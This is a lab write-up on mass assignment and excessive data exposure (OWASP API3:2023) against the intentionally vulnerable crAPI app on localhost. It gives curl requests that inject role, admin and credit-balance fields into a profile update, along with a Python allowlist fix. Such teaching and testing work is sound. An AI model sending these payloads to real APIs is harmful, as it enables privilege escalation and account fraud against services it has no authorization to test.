# API3:2023 — Broken Object Property Level Authorization (BOPLA)

**Target:** crAPI  
**Severity:** 🟠 High  
**CVSS Base Score:** 7.1

---

## 1. Vulnerability Summary

BOPLA (formerly Mass Assignment + Excessive Data Exposure) occurs when an API accepts or returns object properties that the client should not be able to read or write. Two variants:

- **Mass Assignment** — sending unexpected fields in a write request that get persisted (e.g., `"admin": true`)
- **Excessive Data Exposure** — the API returns more data than necessary, trusting the client to filter it

---

## 2. Attack 3A — Mass Assignment (crAPI)

### Steps to Reproduce

```bash
# Normal profile update request
curl -s -X PUT http://localhost:8888/identity/api/v2/user/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Updated Name"}'

# Mass assignment attempt — inject privileged fields
curl -s -X PUT http://localhost:8888/identity/api/v2/user/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Updated Name",
    "role": "admin",
    "credit_balance": 999999,
    "isAdmin": true,
    "available_credit": 9999.99
  }'
```

### What to Look For in the Response

If the injected fields appear in the response or take effect on subsequent requests, mass assignment is confirmed.

---

## 3. Root Cause & Fix

```python
# VULNERABLE — binds all request fields directly to model
user.update(**request.json)

# FIXED — explicit allowlist of writable fields
ALLOWED_UPDATE_FIELDS = {"name", "phone_number"}
safe_data = {k: v for k, v in request.json.items() if k in ALLOWED_UPDATE_FIELDS}
user.update(**safe_data)
```

---

> *Write-up in progress. Full PoC coming soon.*

---

*[← API2](./API2-BrokenAuth.md) | [API4 →](./API4-ResourceConsumption.md)*
